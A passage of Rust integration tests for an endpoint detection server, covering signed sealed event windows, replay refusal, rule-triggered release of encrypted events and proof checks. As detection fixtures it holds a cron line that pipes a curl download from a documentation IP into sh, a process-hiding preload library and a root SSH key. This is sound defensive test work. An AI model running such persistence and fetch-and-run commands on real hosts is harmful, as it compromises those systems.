    assert_refused(&app, &pool, &mut host, wrong_epoch.seal(&[quiet(4)]), forked_chain, stands, "a new epoch that is not fresh").await;

    let mut wrong_fresh = host.ledger.clone();
    wrong_fresh.fresh = true;
    assert_refused(&app, &pool, &mut host, wrong_fresh.seal(&[quiet(4)]), forked_chain, stands, "a fresh window in the stored epoch").await;

    host.restart();
    host.deliver(&app, &[quiet(4)]).await;
    let head = hash_to_hex(&host.ledger.head);
    let mut rolled_back = host.ledger.clone();
    rolled_back.restart();
    rolled_back.epoch = 1;
    assert_refused(&app, &pool, &mut host, rolled_back.seal(&[quiet(5)]), forked_chain, (2, 3, 4, head.as_str()), "an epoch that goes down").await;

    host.deliver(&app, &[quiet(5)]).await;
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "forking-host").await, 4, "the chain the server holds goes on");

    let mut newcomer = enroll_endpoint(&app, &pool, "late-host").await;
    let mut not_fresh = newcomer.ledger.clone();
    not_fresh.fresh = false;
    let genesis = hash_to_hex(&GENESIS);
    assert_refused(&app, &pool, &mut newcomer, not_fresh.seal(&[quiet(1)]), forked_chain, (0, 0, 0, genesis.as_str()), "a first window that is not fresh").await;
    let mut midway = newcomer.ledger.clone();
    midway.next_window = 7;
    assert_refused(&app, &pool, &mut newcomer, midway.seal(&[quiet(1)]), forked_chain, (0, 0, 0, genesis.as_str()), "a chain the server never saw the start of").await;
    newcomer.deliver(&app, &[quiet(1)]).await;
}

#[tokio::test]
async fn test_windows_require_a_valid_signature_and_a_new_sequence_number() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "signing-host").await;
    let window = host.ledger.seal(&[quiet(1)]);

    let body = host.request(window.clone());
    let (status, _) = post_agent(&app, "/api/windows", body.clone(), None).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let impostor = TestAgent::new("signing-host");
    let (status, _) = send_signed(&app, &impostor, "/api/windows", body.clone()).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED, "a forged signature");

    let signature = host.agent.sign(&body);
    let tampered = body.replace("\"proving\":true", "\"proving\":false");
    assert_ne!(tampered, body);
    let (status, _) = post_agent(&app, "/api/windows", tampered, Some(&signature)).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);

    let mut stranger = Endpoint { agent: TestAgent::new("never-enrolled"), ledger: host.ledger.clone() };
    let (status, _) = stranger.send(&app, window.clone()).await;
    assert_eq!(status, StatusCode::UNAUTHORIZED);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "signing-host").await, 0);

    let (status, _) = post_agent(&app, "/api/windows", body.clone(), Some(&signature)).await;
    assert_eq!(status, StatusCode::OK);
    let (status, replayed) = post_agent(&app, "/api/windows", body, Some(&signature)).await;
    assert_eq!(status, StatusCode::CONFLICT);
    assert!(replayed["error"].is_string() && replayed["signature"].is_null() && replayed["epoch"].is_null(), "a replayed request gets no signed refusal, so the agent starts nothing over for it");
    assert_eq!(open_incidents(&pool, "signing-host").await, vec!["replay"]);

    let (status, _) = post_agent(&app, "/api/windows", "{ not a window".to_string(), Some(&signature)).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_a_window_that_does_not_match_its_own_header_is_unprocessable() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "malformed-host").await;
    let other = enroll_endpoint(&app, &pool, "other-host").await;
    let honest = || host.ledger.clone().seal(&[quiet(1), quiet(2), quiet(3)]);

    let mut wrong_root = honest();
    wrong_root.header.root = hash_to_hex(&[7u8; 32]);
    let mut reordered = honest();
    reordered.events.swap(0, 1);
    let mut dropped = honest();
    dropped.events.pop();
    let mut wrong_count = honest();
    wrong_count.header.count = 2;
    let mut added = honest();
    added.events.push(added.events[0].clone());
    let mut wrong_head = honest();
    wrong_head.header.head = hash_to_hex(&[7u8; 32]);
    let mut renumbered = honest();
    renumbered.header.first_index = 1;
    let mut not_hex = honest();
    not_hex.events[1].leaf = "leaf".to_string();
    let mut not_base64 = honest();
    not_base64.events[1].sealed = "not base64!".to_string();
    let mut too_large = honest();
    too_large.header.epoch = u64::MAX;
    let borrowed = other.ledger.clone().seal(&[quiet(1), quiet(2), quiet(3)]);

    let cases = [
        ("a root that is not the root of its leaves", wrong_root),
        ("leaves in another order", reordered),
        ("fewer events than it counts", dropped),
        ("a count that is not its number of events", wrong_count),
        ("more events than it counts", added),
        ("a head that does not follow from its fields", wrong_head),
        ("a field changed after sealing", renumbered),
        ("a leaf that is not hex", not_hex),
        ("sealed bytes that are not base64", not_base64),
        ("a number no database holds", too_large),
        ("a window sealed for another agent", borrowed),
    ];
    let malformed = (StatusCode::UNPROCESSABLE_ENTITY, "window_malformed");
    let genesis = hash_to_hex(&GENESIS);
    for (case, window) in cases {
        assert_refused(&app, &pool, &mut host, window, malformed, (0, 0, 0, genesis.as_str()), case).await;
    }
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_windows WHERE agent_id = ?", "malformed-host").await, 0);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "malformed-host").await, 0);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM chain_positions WHERE agent_id = ?", "malformed-host").await, 0);

    host.deliver(&app, &[quiet(1), quiet(2), quiet(3)]).await;
    host.restart();
    host.deliver(&app, &[quiet(4)]).await;
    let head = hash_to_hex(&host.ledger.head);
    let mut broken = host.ledger.clone().seal(&[quiet(5)]);
    broken.events.clear();
    assert_refused(&app, &pool, &mut host, broken, malformed, (2, 2, 4, head.as_str()), "a malformed window after the chain has grown").await;
    host.deliver(&app, &[quiet(5)]).await;
}

#[tokio::test]
async fn test_quiet_events_never_reach_any_table_in_plaintext() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "private-host").await;
    let quiet_marker = "QUIET-7f3a9c51e2-payroll-export";
    let loud_marker = "LOUD-5d1b8e0a44-web-shell";

    host.deliver(
        &app,
        &[
            started(10, 300, 1, "/usr/bin/psql", &["-c", &format!("copy salaries to '/srv/{}.csv'", quiet_marker)]),
            started(11, 20, 0, "/usr/sbin/nginx", &[]),
            connected(12, 300, 5432),
            wrote(13, 300, &format!("/srv/{}.csv", quiet_marker)),
            autostart(InventoryAction::Present, PersistenceKind::Cron, quiet_marker, "/etc/cron.d/payroll", &format!("/usr/local/bin/{} --nightly", quiet_marker), None),
            package(InventoryAction::Present, PackageManager::Dpkg, quiet_marker, "1.0", None),
        ],
    )
    .await;
    host.deliver(&app, &[started(14, 21, 20, "/bin/sh", &["-c", &format!("echo {}", loud_marker)]), started(15, 301, 300, "/usr/bin/gzip", &[&format!("/srv/{}.csv", quiet_marker)])]).await;
    let journal = host.ledger.journal(2);
    assert_eq!(journal.matches.len(), 1);

    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "private-host").await, 8);
    assert_eq!(tables_holding(&pool, quiet_marker).await, Vec::<String>::new(), "what no rule released is nowhere to be read");
    assert_eq!(
        tables_holding(&pool, loud_marker).await,
        ["events.data", "hunt_processes.command", "incidents.evidence"],
        "the search does find what a rule released"
    );

    for query in [format!("process where command ~ \"{}\"", quiet_marker), format!("file where path ~ \"{}\"", quiet_marker), format!("persistence where name ~ \"{}\"", quiet_marker)] {
        assert_eq!(hunt_total(&app, &query).await, 0, "{}", query);
    }
    let (_, listed) = call(&app, "GET", "/api/admin/events?agent_id=private-host&limit=1000", Some(&admin_token("user")), None).await;
    assert!(!listed.to_string().contains(quiet_marker));
    assert!(listed.to_string().contains(loud_marker));
}

#[tokio::test]
async fn test_a_match_opens_exactly_the_events_its_rule_read() {
    set_test_env();
    let pool = create_test_db().await;
    let (agent_events_tx, _) = tokio::sync::broadcast::channel(16);
    let (system_events_tx, mut told) = tokio::sync::broadcast::channel(64);
    let app = zedr_control_server::api::create_router_with_state(pool.clone(), agent_events_tx, system_events_tx);
    let mut host = enroll_endpoint(&app, &pool, "web-host").await;
    let reader = admin_token("user");

    let nginx = started(1, 20, 0, "/usr/sbin/nginx", &[]);
    let shell = started(2, 21, 20, "/bin/sh", &["-c", "id"]);
    host.deliver(&app, &[quiet(30), nginx.clone(), quiet(31)]).await;
    assert!(told.try_recv().is_err(), "a window without a match tells the console nothing");
    host.deliver(&app, &[quiet(32), shell.clone(), quiet(33)]).await;

    let mut announced = Vec::new();
    while let Ok(event) = told.try_recv() {
        announced.push(event.event_type);
    }
    assert_eq!(announced, ["process", "process", "detection", "incident_opened"]);

    let (status, listed) = call(&app, "GET", "/api/admin/events?agent_id=web-host&event_types=process,network,file,persistence,package", Some(&reader), None).await;
    assert_eq!(status, StatusCode::OK);
    let mut opened: Vec<serde_json::Value> = listed.as_array().unwrap().iter().map(|event| serde_json::from_str(event["data"].as_str().unwrap()).unwrap()).collect();
    opened.sort_by_key(|event| event["pid"].as_u64());
    assert_eq!(opened, [stored_form(&nginx), stored_form(&shell)], "the event list holds the shell and its parent, and none of their neighbours");

    let (_, found) = hunt(&app, Some(&reader), r#"process where name = sh and parent.name = nginx and parent.path = "/usr/sbin/nginx""#).await;
    assert_eq!(found["total"], 1);
    assert_eq!(found["rows"][0]["process"], "21@2");
    assert_eq!(found["rows"][0]["cells"], serde_json::json!(["sh", "nginx", "/bin/sh -c id", "21", "1001"]));
    assert_eq!(hunt_total(&app, "process where name = nginx and parent.pid = 0").await, 1);
    assert_eq!(hunt_total(&app, "process where name = sleep").await, 0, "the neighbours stay sealed");

    let evidence = serde_json::json!({
        "rule": "server-child", "title": "Server process started a shell", "technique": "T1505.003", "level": "high", "pid": 21, "started_at": 2,
        "image": "/bin/sh", "command": "/bin/sh -c id", "parent": "nginx", "subject": null, "autostart": null, "trigger": 4, "window": 1, "proof": "pending",
    });
    let mut recorded = findings(&pool, "web-host").await;
    assert_eq!(recorded.len(), 1);
    assert_eq!(recorded[0].as_object_mut().unwrap().remove("source"), Some(serde_json::json!("server")));
    assert_eq!(recorded[0], evidence);
    assert_eq!(open_incidents(&pool, "web-host").await, vec!["detection.server-child"]);
    assert_eq!(incident_evidence(&pool, "web-host", "detection.server-child").await, evidence);
    assert_eq!(hunt_total(&app, "detection where rule = server-child and parent = nginx").await, 1);

    let opened_at: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'web-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
    assert_eq!(opened_at, [1, 4]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events s JOIN events e ON e.id = s.event_id WHERE s.agent_id = ? AND e.event_type = 'process'", "web-host").await, 2);
    let release: (i64, i64, String, i64, i64, String, bool) = sqlx::query_as("SELECT window, trigger_idx, rule, pid, started_at, context, proven FROM releases WHERE agent_id = 'web-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(release, (1, 4, "server-child".to_string(), 21, 2, "[1]".to_string(), false));
}

#[tokio::test]
async fn test_a_connection_finding_opens_the_connection_its_process_and_the_parent() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "shell-host").await;

    host.deliver(&app, &[started(50, 400, 1, "/usr/sbin/sshd", &[]), quiet(60), started(70, 401, 400, "/bin/bash", &["deploy.sh"]), connected(71, 402, 443)]).await;
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "shell-host").await, 0);
    host.deliver(&app, &[quiet(61), connected(80, 401, 8443), connected(81, 401, 9000), wrote(82, 401, "/opt/app/run.sh")]).await;

    let recorded = findings(&pool, "shell-host").await;
    assert_eq!(recorded.iter().map(|finding| finding["rule"].as_str().unwrap()).collect::<Vec<_>>(), ["shell-network", "drops-executable"]);
    let reached = &recorded[0];
    assert_eq!((reached["subject"].as_str(), reached["parent"].as_str(), reached["image"].as_str(), reached["level"].as_str()), (Some("203.0.113.47:8443"), Some("sshd"), Some("/bin/bash"), Some("medium")));
    assert_eq!((reached["pid"].as_u64(), reached["started_at"].as_u64(), reached["trigger"].as_u64(), reached["window"].as_u64()), (Some(401), Some(70), Some(5), Some(1)));
    assert_eq!(recorded[1]["subject"], "/opt/app/run.sh");
    assert_eq!(open_incidents(&pool, "shell-host").await, vec!["detection.drops-executable"], "a medium finding is recorded without an incident");

    let opened: Vec<i64> = sqlx::query_scalar("SELECT idx FROM sealed_events WHERE agent_id = 'shell-host' AND opened_at IS NOT NULL ORDER BY idx").fetch_all(&pool).await.unwrap();
    assert_eq!(opened, [0, 2, 5, 7], "the second connection of the same shell opens nothing more");
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", "shell-host").await, 2, "an event two rules read is stored once");
    assert_eq!(hunt_total(&app, "connection where process.name = bash and dest.port = 8443").await, 1);
    assert_eq!(hunt_total(&app, "connection where dest.port in (443, 9000)").await, 0);
    assert_eq!(hunt_total(&app, "file where process.name = bash and action = Write").await, 1);
    let (_, shell) = hunt(&app, Some(&admin_token("user")), "process where name = bash and parent.name = sshd").await;
    assert_eq!(shell["rows"][0]["process"], "401@70", "the process row carries the key the connection and the finding carry");
}

#[tokio::test]
async fn test_an_autostart_finding_opens_the_item_alone() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "autostart-host").await;
    let fetch = "* * * * * root curl -fsS http://203.0.113.47/u | sh";

    host.deliver(
        &app,
        &[
            autostart(InventoryAction::Present, PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", None),
            autostart(InventoryAction::Added, PersistenceKind::Cron, "sysupdate", "/etc/cron.d/sysupdate", fetch, None),
            autostart(InventoryAction::Added, PersistenceKind::Cron, "logrotate2", "/etc/cron.d/logrotate2", fetch, None),
            autostart(InventoryAction::Added, PersistenceKind::LdPreload, "libprocesshider.so", "/etc/ld.so.preload", "/usr/local/lib/libprocesshider.so", None),
            autostart(InventoryAction::Added, PersistenceKind::AuthorizedKey, "root@build", "/root/.ssh/authorized_keys", "ssh-ed25519", None),
        ],
    )
    .await;

    let recorded = findings(&pool, "autostart-host").await;
    let told: Vec<(&str, &str, &str, &str)> = recorded
        .iter()
        .map(|finding| (finding["rule"].as_str().unwrap(), finding["subject"].as_str().unwrap(), finding["autostart"].as_str().unwrap(), finding["technique"].as_str().unwrap()))
        .collect();
    assert_eq!(
        told,
        [
            ("autostart-fetch", "sysupdate", "cron", "T1053.003"),
            ("autostart-fetch", "logrotate2", "cron", "T1053.003"),
            ("preload-added", "libprocesshider.so", "ld_preload", "T1574.006"),
            ("root-key-added", "root@build", "authorized_key", "T1098.004"),
        ],
        "two items found in the same look are two findings"
    );
    assert_eq!((recorded[0]["image"].as_str(), recorded[0]["command"].as_str(), recorded[0]["pid"].as_u64(), recorded[0]["parent"].is_null()), (Some("/etc/cron.d/sysupdate"), Some(fetch), Some(0), true));
    assert_eq!(open_incidents(&pool, "autostart-host").await, vec!["detection.autostart-fetch", "detection.preload-added"]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'persistence'", "autostart-host").await, 4);
    assert_eq!(hunt_total(&app, "persistence where kind = cron and command ~ curl").await, 2);
    assert_eq!(hunt_total(&app, "persistence where name = ssh.service").await, 0);
}

fn nginx_and_its_shell() -> (SensorEvent, SensorEvent) {
    (started(1, 20, 0, "/usr/sbin/nginx", &[]), started(2, 21, 20, "/bin/sh", &["-c", "id"]))
}

async fn assert_nothing_was_opened(pool: &SqlitePool, agent_id: &str, case: &str) {
    assert_eq!(open_incidents(pool, agent_id).await, vec!["release_invalid"], "{}", case);
    assert!(incident_evidence(pool, agent_id, "release_invalid").await["reason"].as_str().is_some_and(|reason| !reason.is_empty()), "{}", case);
    assert_eq!(count(pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type IN ('process', 'network', 'file', 'persistence', 'package', 'detection')", agent_id).await, 0, "{}", case);
    assert_eq!(count(pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND (opened_at IS NOT NULL OR event_id IS NOT NULL)", agent_id).await, 0, "{}", case);
    assert_eq!(count(pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", agent_id).await, 0, "{}", case);
    assert_eq!(count(pool, "SELECT COUNT(*) FROM hunt_processes WHERE agent_id = ?", agent_id).await, 0, "{}", case);
}

#[tokio::test]
async fn test_a_release_that_does_not_hold_opens_nothing_and_raises_an_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    type Change = fn(&mut Release, &TestLedger);
    let cases: [(&str, Change); 13] = [
        ("a seed that opens nothing", |release, _| release.openings[0].seed = hash_to_hex(&[1u8; 32])),
        ("the seed of another event", |release, ledger| release.openings[1].seed = ledger.opening(1).seed),
        ("seeds given to the wrong events", |release, _| {
            let (trigger, parent) = (release.openings[0].seed.clone(), release.openings[1].seed.clone());
            release.openings[0].seed = parent;
            release.openings[1].seed = trigger;
        }),
        ("a seed that is not hex", |release, _| release.openings[0].seed = "seed".to_string()),
        ("a missing opening", |release, _| {
            release.openings.pop();
        }),
        ("an extra opening", |release, ledger| release.openings.push(ledger.opening(2))),
        ("an opening given twice in place of another", |release, _| release.openings[1] = release.openings[0].clone()),
        ("a rule that does not exist", |release, _| release.rule = "no-such-rule".to_string()),
        ("another rule than its events fit", |release, _| release.rule = "shell-network".to_string()),
        ("another process than its event shows", |release, _| release.pid = 99),
        ("a context that does not come before the trigger", |release, ledger| {
            release.context = vec![3];
            release.openings[1] = ledger.opening(3);
        }),
        ("more context than any rule reads", |release, ledger| {
            release.context = vec![0, 1, 2];
            release.openings = [3, 0, 1, 2].map(|index| ledger.opening(index)).to_vec();
        }),
        ("a trigger from an earlier window", |release, ledger| {
            *release = Release { trigger: 1, rule: "writable-image".to_string(), context: Vec::new(), pid: 30, started_at: 30, openings: vec![ledger.opening(1)] };
        }),
    ];

    for (number, (case, change)) in cases.into_iter().enumerate() {
        let agent_id = format!("release-host-{}", number);
        let mut host = enroll_endpoint(&app, &pool, &agent_id).await;
        let (nginx, shell) = nginx_and_its_shell();
        host.deliver(&app, &[nginx, quiet(30)]).await;

        let mut window = host.ledger.seal(&[quiet(31), shell]);
        assert_eq!(window.releases.len(), 1);
        change(&mut window.releases[0], &host.ledger);
        let (status, ack) = host.send(&app, window).await;
        assert_eq!(status, StatusCode::OK, "{}: the window itself is held, {}", case, ack);
        assert_eq!(ack["next_index"], 4, "{}", case);
        assert_nothing_was_opened(&pool, &agent_id, case).await;
    }
}

#[tokio::test]
async fn test_a_release_cannot_reach_into_another_epoch_or_be_given_twice() {
    let (app, pool) = create_test_app_with_pool().await;
    let (nginx, shell) = nginx_and_its_shell();

    let mut restarted = enroll_endpoint(&app, &pool, "epoch-host").await;
    restarted.deliver(&app, &[nginx.clone(), quiet(30)]).await;
    restarted.restart();
    let mut window = restarted.ledger.seal(&[quiet(31), shell.clone()]);
    assert!(window.releases.is_empty(), "the rules start over with the epoch, so they no longer know the parent");
    window.releases.push(Release { trigger: 3, rule: "server-child".to_string(), context: vec![0], pid: 21, started_at: 2, openings: vec![restarted.ledger.opening(3), restarted.ledger.opening(0)] });
    let (status, _) = restarted.send(&app, window).await;
    assert_eq!(status, StatusCode::OK);
    assert_nothing_was_opened(&pool, "epoch-host", "a context from another epoch").await;
    assert!(incident_evidence(&pool, "epoch-host", "release_invalid").await["reason"].as_str().unwrap().contains("another epoch"));

    let mut repeating = enroll_endpoint(&app, &pool, "repeating-host").await;
    repeating.deliver(&app, &[nginx, quiet(30)]).await;
    let mut window = repeating.ledger.seal(&[quiet(31), shell]);
    window.releases.push(window.releases[0].clone());
    let (status, _) = repeating.send(&app, window).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(open_incidents(&pool, "repeating-host").await, vec!["detection.server-child", "release_invalid"]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ?", "repeating-host").await, 1);
    assert_eq!(findings(&pool, "repeating-host").await.len(), 1);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM events WHERE agent_id = ? AND event_type = 'process'", "repeating-host").await, 2);
}

#[tokio::test]
async fn test_an_opened_event_must_be_the_one_its_leaf_commits_to() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "swapping-host").await;
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(&app, &[nginx, quiet(30)]).await;

    let mut window = host.ledger.seal(&[quiet(31), shell]);
    let harmless = started(2, 21, 20, "/bin/sh", &["-c", "true"]).to_bytes();
    let ledger = &host.ledger;
    let seed = seal::seed(&ledger.master, &ledger.agent, ledger.epoch, 3, &harmless);
    window.events[1].sealed = bytes_to_base64(&seal::seal(&seed, &ledger.agent, ledger.epoch, 3, &harmless).unwrap());
    window.releases[0].openings[0].seed = hash_to_hex(&seed);

    let (status, _) = host.send(&app, window).await;
    assert_eq!(status, StatusCode::OK, "the header and the leaves are those of the events that happened");
    assert_nothing_was_opened(&pool, "swapping-host", "sealed bytes that open to another event than the committed one").await;
    assert!(incident_evidence(&pool, "swapping-host", "release_invalid").await["reason"].as_str().unwrap().contains("leaf commits to"));
}

#[tokio::test]
async fn test_a_window_that_says_events_were_lost_opens_a_gap_incident() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "lossy-host").await;
    host.deliver(&app, &[quiet(1)]).await;
    assert!(open_incidents(&pool, "lossy-host").await.is_empty());

    let window = host.ledger.seal_marked(&[quiet(2)], true);
    let (status, _) = host.send(&app, window).await;
    assert_eq!(status, StatusCode::OK, "the chain says so itself, the window is held");
    assert_eq!(open_incidents(&pool, "lossy-host").await, vec!["chain_gap"]);
    assert_eq!(incident_evidence(&pool, "lossy-host", "chain_gap").await, serde_json::json!({ "window": 1, "epoch": 1, "first_index": 1 }));
}

#[tokio::test]
async fn test_a_window_is_read_above_the_event_batch_limit_and_refused_above_its_own() {
    let (app, pool) = create_test_app_with_pool().await;
    let mut host = enroll_endpoint(&app, &pool, "busy-host").await;

    let large: Vec<SensorEvent> = (0u32..12).map(|pid| started(u64::from(pid), pid, 1, "/usr/bin/java", &["-cp", &"x".repeat(200_000)])).collect();
    let window = host.ledger.seal(&large);
    let body = host.request(window);
    assert!(body.len() > zedr_protocol::MAX_EVENT_BATCH_BYTES);
    let (status, _) = send_signed(&app, &host.agent, "/api/windows", body).await;
    assert_eq!(status, StatusCode::OK);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ? AND LENGTH(ciphertext) = 262144 + 16", "busy-host").await, 12);

    let many: Vec<SensorEvent> = (100u32..1300).map(quiet).collect();
    host.deliver(&app, &many).await;
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM sealed_events WHERE agent_id = ?", "busy-host").await, 1212);
    assert_eq!(count(&pool, "SELECT MAX(idx) FROM sealed_events WHERE agent_id = ?", "busy-host").await, 1211);

    let mut too_large = host.ledger.clone().seal(&[quiet(1)]);
    too_large.agent_id = "x".repeat(zedr_control_server::api::ingestion::windows::MAX_WINDOW_BYTES);
    let body = serde_json::to_string(&too_large).unwrap();
    let (status, _) = send_signed(&app, &host.agent, "/api/windows", body).await;
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
}

async fn tell_a_story(app: &axum::Router, host: &mut Endpoint) {
    let (nginx, shell) = nginx_and_its_shell();
    host.deliver(app, &[nginx, quiet(30)]).await;
    host.deliver(app, &[quiet(31), shell]).await;
    host.deliver(app, &[quiet(32)]).await;
}

#[tokio::test]
async fn test_a_proof_marks_its_windows_verified_and_its_findings_proven() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "proving-host").await;
    tell_a_story(&app, &mut host).await;
    assert_eq!(proof_states(&pool, "proving-host").await, ["pending", "pending", "pending"]);

    let journal = host.ledger.journal(3);
    assert_eq!(journal.matches.len(), 1);
    let (status, ack) = host.prove(&app, &journal).await;
    assert_eq!(status, StatusCode::OK, "{}", ack);
    assert_eq!(ack, serde_json::json!({ "first_window": 0, "last_window": 2 }));

    assert_eq!(proof_states(&pool, "proving-host").await, ["verified", "verified", "verified"]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "proving-host").await, 1);
    assert_eq!(findings(&pool, "proving-host").await[0]["proof"], "verified");
    assert_eq!(findings(&pool, "proving-host").await[0]["parent"], "nginx", "the rest of the evidence is as it was");
    assert_eq!(incident_evidence(&pool, "proving-host", "detection.server-child").await["proof"], "verified");
    assert_eq!(open_incidents(&pool, "proving-host").await, vec!["detection.server-child"]);

    let stored: (i64, i64, i64, String, String, String) = sqlx::query_as("SELECT epoch, first_window, last_window, image_id, state_in, state_out FROM proofs WHERE agent_id = 'proving-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(stored, (1, 0, 2, hash_to_hex(&TEST_IMAGE_ID), hash_to_hex(&GENESIS), hash_to_hex(&journal.state_out)));
    let proven: (i64, String) = sqlx::query_as("SELECT proven_window, proven_state FROM chain_positions WHERE agent_id = 'proving-host'").fetch_one(&pool).await.unwrap();
    assert_eq!(proven, (2, hash_to_hex(&journal.state_out)));
}

#[tokio::test]
async fn test_a_second_proof_chains_from_the_first_and_a_proof_sent_again_changes_nothing() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "chaining-host").await;
    tell_a_story(&app, &mut host).await;
    host.deliver(&app, &[connected(40, 21, 443)]).await;
    host.deliver(&app, &[quiet(33)]).await;

    let first = host.ledger.journal(2);
    assert_eq!(host.prove(&app, &first).await.0, StatusCode::OK);
    assert_eq!(proof_states(&pool, "chaining-host").await, ["verified", "verified", "pending", "pending", "pending"]);

    let second = host.ledger.journal(3);
    assert!(!second.fresh && second.state_in == first.state_out);
    assert_eq!(second.matches.len(), 1, "the shell reached the network, which only the rule state of the first proof can tell");

    let mut forgetful = second.clone();
    forgetful.state_in = [3u8; 32];
    let (status, _) = host.prove(&app, &forgetful).await;
    assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "a proof that starts from another rule state than the last one left");
    assert_eq!(open_incidents(&pool, "chaining-host").await, vec!["detection.server-child", "proof_invalid"]);
    sqlx::query("UPDATE incidents SET closed_at = opened_at WHERE incident_type = 'proof_invalid'").execute(&pool).await.unwrap();

    let (status, ack) = host.prove(&app, &second).await;
    assert_eq!((status, ack), (StatusCode::OK, serde_json::json!({ "first_window": 2, "last_window": 4 })));
    assert_eq!(proof_states(&pool, "chaining-host").await, ["verified"; 5]);
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM releases WHERE agent_id = ? AND proven = 1", "chaining-host").await, 2);
    assert_eq!(count(&pool, "SELECT proven_window FROM chain_positions WHERE agent_id = ?", "chaining-host").await, 4);

    for journal in [&first, &second] {
        let (status, ack) = host.prove(&app, journal).await;
        assert_eq!(status, StatusCode::OK, "the answer to a proof may have been lost on its way: {}", ack);
    }
    assert_eq!(count(&pool, "SELECT COUNT(*) FROM proofs WHERE agent_id = ?", "chaining-host").await, 2);
    assert_eq!(count(&pool, "SELECT proven_window FROM chain_positions WHERE agent_id = ?", "chaining-host").await, 4);
    assert_eq!(open_incidents(&pool, "chaining-host").await, vec!["detection.server-child"]);

    let mut another_ending = first.clone();
    another_ending.state_out = [4u8; 32];
    assert_eq!(host.prove(&app, &another_ending).await.0, StatusCode::UNPROCESSABLE_ENTITY, "the windows have their proof, another one for them is not taken");
}

#[tokio::test]
async fn test_a_proof_that_contradicts_what_the_server_holds_is_refused() {
    let (app, pool) = create_proving_app().await;
    let mut host = enroll_endpoint(&app, &pool, "refused-host").await;
    tell_a_story(&app, &mut host).await;

    let honest = host.ledger.journal(3);
    let mut skipping = host.ledger.clone();
    skipping.proven = 0;
    skipping.journal(1);
    let orphan = skipping.journal(2);
    assert!(!orphan.fresh && orphan.first_window == 1);

    type Change = fn(&mut Journal);
    let cases: [(&str, Change); 14] = [
        ("a window the server does not hold", |journal| journal.last_window = 3),
        ("windows the server never saw", |journal| (journal.first_window, journal.last_window) = (7, 9)),
        ("a range that ends before it starts", |journal| (journal.first_window, journal.last_window) = (2, 0)),
        ("another head before the first window", |journal| journal.head_in = [1u8; 32]),
        ("another head after the last window", |journal| journal.head_out = [1u8; 32]),
        ("another agent", |journal| journal.agent = [1u8; 32]),
        ("a journal version this server does not read", |journal| journal.version = JOURNAL_VERSION + 1),
        ("another epoch", |journal| journal.epoch = 2),
        ("a fresh epoch told as a continued one", |journal| journal.fresh = false),
        ("a fresh epoch that starts from a rule state", |journal| journal.state_in = [1u8; 32]),
        ("another first event", |journal| journal.first_index = 1),
        ("another last event", |journal| journal.next_index += 1),
        ("fewer windows than its heads span", |journal| journal.last_window = 1),
        ("numbers no chain has", |journal| journal.next_index = u64::MAX),
    ];
    let mut refused: Vec<(&str, Vec<u8>)> = cases
        .into_iter()
        .map(|(case, change)| {
            let mut journal = honest.clone();
            change(&mut journal);
            (case, journal.to_bytes())
        })
        .collect();
    refused.push(("a continued epoch with no proof before it", orphan.to_bytes()));
    refused.push(("a receipt that does not verify", Vec::new()));
    refused.push(("a journal that cannot be read", b"not a journal".to_vec()));
    let mut trailing = honest.to_bytes();
    trailing.push(0);
    refused.push(("a journal with bytes after its end", trailing));

    for (case, receipt) in refused {
        let (status, answer) = host.submit(&app, &receipt).await;
        assert_eq!(status, StatusCode::UNPROCESSABLE_ENTITY, "{}: {}", case, answer);
        assert_eq!(open_incidents(&pool, "refused-host").await, vec!["detection.server-child", "proof_invalid"], "{}", case);
